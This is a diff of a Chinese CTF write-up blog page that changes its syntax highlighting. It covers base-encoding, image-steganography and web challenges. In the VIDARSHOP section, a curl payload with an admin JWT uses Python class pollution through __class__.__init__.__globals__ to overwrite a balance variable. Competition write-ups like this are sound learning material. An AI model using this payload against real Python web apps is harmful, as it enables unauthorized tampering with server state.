@@ -368,6 +368,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -379,22 +382,105 @@
 <p>扔给ai识别说有85个表情自然就陷入了Base85(虽然后面还是会用到)非常明确肯定是base大家族。但是无论是从已知的形式hgame{}来看还是首字母来看都无法解密。（其实应该看到打好基础就知道是base的嵌套，当时没有想到。。。</p>
 <p>经过base100,92，91，85，64，62，58，45，32后即可得到flag。</p>
 <h2 id="shiori不想找女朋友"><a href="#shiori不想找女朋友" class="headerlink" title="shiori不想找女朋友"></a>shiori不想找女朋友</h2><p>这题完全是因为我自己的问题，直接用windows打开解压后发现只有一张图片，通过exiftool发现其中有一段json：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;block&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> <span class="attr">&quot;start_x&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> <span class="attr">&quot;start_y&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> <span class="attr">&quot;step_x&quot;</span><span class="punctuation">:</span> <span class="number">7</span><span class="punctuation">,</span> <span class="attr">&quot;step_y&quot;</span><span class="punctuation">:</span> <span class="number">7</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;column_num&quot;</span><span class="punctuation">:</span> <span class="number">450</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"block"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token property">"start_x"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token property">"start_y"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token property">"step_x"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token property">"step_y"</span><span class="token operator">:</span> <span class="token number">7</span><span class="token punctuation">,</span>
+<span class="token property">"column_num"</span><span class="token operator">:</span> <span class="token number">450</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
 <p>一种隐写，起始位置和步长全标出来了写脚本复原：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">CHALLENGE_FILE = <span class="string">&quot;shiori.png&quot;</span></span><br><span class="line"></span><br><span class="line">OUTPUT_FILE = <span class="string">&quot;key.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line"></span><br><span class="line">  img = Image.<span class="built_in">open</span>(CHALLENGE_FILE)</span><br><span class="line"></span><br><span class="line">  b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  sx = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">  sy = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">  dx = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">  dy = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">  w_blocks = <span class="number">450</span></span><br><span class="line"></span><br><span class="line">  canvas_w = w_blocks * b</span><br><span class="line"></span><br><span class="line">  canvas_h = <span class="number">600</span></span><br><span class="line"></span><br><span class="line">  restored_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (canvas_w, canvas_h), <span class="string">&#x27;lightgray&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  c_w, c_h = img.size</span><br><span class="line"></span><br><span class="line">  carrier_x, carrier_y = sx, sy</span><br><span class="line"></span><br><span class="line">  target_col, target_row = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> carrier_y + b &gt; c_h:</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">​    box = (carrier_x, carrier_y, carrier_x + b, carrier_y + b)</span><br><span class="line"></span><br><span class="line">​    block = img.crop(box)</span><br><span class="line"></span><br><span class="line">​    paste_x = target_col * b</span><br><span class="line"></span><br><span class="line">​    paste_y = target_row * b</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> paste_y + b &gt; canvas_h: </span><br><span class="line"></span><br><span class="line">​      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">​    restored_img.paste(block, (paste_x, paste_y))</span><br><span class="line"></span><br><span class="line">​    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​    target_col += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> target_col &gt;= w_blocks:</span><br><span class="line"></span><br><span class="line">​      target_col = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​    target_row += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​    carrier_x += dx</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> carrier_x + b &gt; c_w:</span><br><span class="line"></span><br><span class="line">​      carrier_x = sx</span><br><span class="line"></span><br><span class="line">​    carrier_y += dy</span><br><span class="line"></span><br><span class="line">  restored_img.save(OUTPUT_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">  solve()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+
+CHALLENGE_FILE <span class="token operator">=</span> <span class="token string">"shiori.png"</span>
+
+OUTPUT_FILE <span class="token operator">=</span> <span class="token string">"key.png"</span>
+
+<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+  img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>CHALLENGE_FILE<span class="token punctuation">)</span>
+
+  b <span class="token operator">=</span> <span class="token number">1</span>
+
+  sx <span class="token operator">=</span> <span class="token number">10</span>
+
+  sy <span class="token operator">=</span> <span class="token number">10</span>
+
+  dx <span class="token operator">=</span> <span class="token number">7</span>
+
+  dy <span class="token operator">=</span> <span class="token number">7</span>
+
+  w_blocks <span class="token operator">=</span> <span class="token number">450</span>
+
+  canvas_w <span class="token operator">=</span> w_blocks <span class="token operator">*</span> b
+
+  canvas_h <span class="token operator">=</span> <span class="token number">600</span>
+
+  restored_img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>canvas_w<span class="token punctuation">,</span> canvas_h<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'lightgray'</span><span class="token punctuation">)</span>
+
+  c_w<span class="token punctuation">,</span> c_h <span class="token operator">=</span> img<span class="token punctuation">.</span>size
+
+  carrier_x<span class="token punctuation">,</span> carrier_y <span class="token operator">=</span> sx<span class="token punctuation">,</span> sy
+
+  target_col<span class="token punctuation">,</span> target_row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
+
+  count <span class="token operator">=</span> <span class="token number">0</span>
+
+  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+
+​    <span class="token keyword">if</span> carrier_y <span class="token operator">+</span> b <span class="token operator">></span> c_h<span class="token punctuation">:</span>
+
+​      <span class="token keyword">break</span>
+
+​    box <span class="token operator">=</span> <span class="token punctuation">(</span>carrier_x<span class="token punctuation">,</span> carrier_y<span class="token punctuation">,</span> carrier_x <span class="token operator">+</span> b<span class="token punctuation">,</span> carrier_y <span class="token operator">+</span> b<span class="token punctuation">)</span>
+
+​    block <span class="token operator">=</span> img<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>box<span class="token punctuation">)</span>
+
+​    paste_x <span class="token operator">=</span> target_col <span class="token operator">*</span> b
+
+​    paste_y <span class="token operator">=</span> target_row <span class="token operator">*</span> b
+
+​    <span class="token keyword">if</span> paste_y <span class="token operator">+</span> b <span class="token operator">></span> canvas_h<span class="token punctuation">:</span> 
+
+​      <span class="token keyword">break</span>
+
+​    restored_img<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>block<span class="token punctuation">,</span> <span class="token punctuation">(</span>paste_x<span class="token punctuation">,</span> paste_y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+​    count <span class="token operator">+=</span> <span class="token number">1</span>
+
+​    target_col <span class="token operator">+=</span> <span class="token number">1</span>
+
+​    <span class="token keyword">if</span> target_col <span class="token operator">>=</span> w_blocks<span class="token punctuation">:</span>
+
+​      target_col <span class="token operator">=</span> <span class="token number">0</span>
+
+​    target_row <span class="token operator">+=</span> <span class="token number">1</span>
+
+​    carrier_x <span class="token operator">+=</span> dx
+
+​    <span class="token keyword">if</span> carrier_x <span class="token operator">+</span> b <span class="token operator">></span> c_w<span class="token punctuation">:</span>
+
+​      carrier_x <span class="token operator">=</span> sx
+
+​    carrier_y <span class="token operator">+=</span> dy
+
+  restored_img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>OUTPUT_FILE<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+
+  solve<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>(wp的脚本，更加简洁)<br>然后组成图片如下</p>
 <p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/reconstructed_hidden.png"></p>
 <p>然后就可以解密拿到一个其实是png的jpg了，我们用convert把他转化成jpg，alpha通道会自动丢弃得到flag。(以后我一定先查附件本身压缩(哭))</p>
 <h2 id="VIDARSHOP"><a href="#VIDARSHOP" class="headerlink" title="VIDARSHOP"></a>VIDARSHOP</h2><p>我那个时候其实注意力全放在jwt上了，以为是jwt弱密钥爆破，结果jwt里面带的是usename而且也不靠他来检验身份，做了很多无用功(😂)，原来不是窃取管理员身份,而是借助管理员id改我自己的钱。有考虑过原型链污染，但是uid的生成逻辑我完全没想到。</p>
 <p>这题根据提示需要我们覆盖balance的值，同时有一个&#x2F;api&#x2F;update的端口通过</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>访问全局变量balance并覆盖：以下是payload:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://forward.vidar.club:32530/api/update \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidWlkIjoiMTQxMzkxNCIsImV4cCI6MTc3MjA3NTEwNH0.fck9rFNaNobg-GdL-XgIRWxSamSGBh4vM61Y6aaqg5s&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;UID: 1413914&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;__class__&quot;: &#123;&quot;__init__&quot;: &#123;&quot;__globals__&quot;: &#123;&quot;balance&quot;: 1000000&#125;&#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST http://forward.vidar.club:32530/api/update <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidWlkIjoiMTQxMzkxNCIsImV4cCI6MTc3MjA3NTEwNH0.fck9rFNaNobg-GdL-XgIRWxSamSGBh4vM61Y6aaqg5s"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">"UID: 1413914"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">-d</span> <span class="token string">'&#123;"__class__": &#123;"__init__": &#123;"__globals__": &#123;"balance": 1000000&#125;&#125;&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>刷新界面会发现我们的余额已经可以买flag了。</p>
 
@@ -588,6 +674,9 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
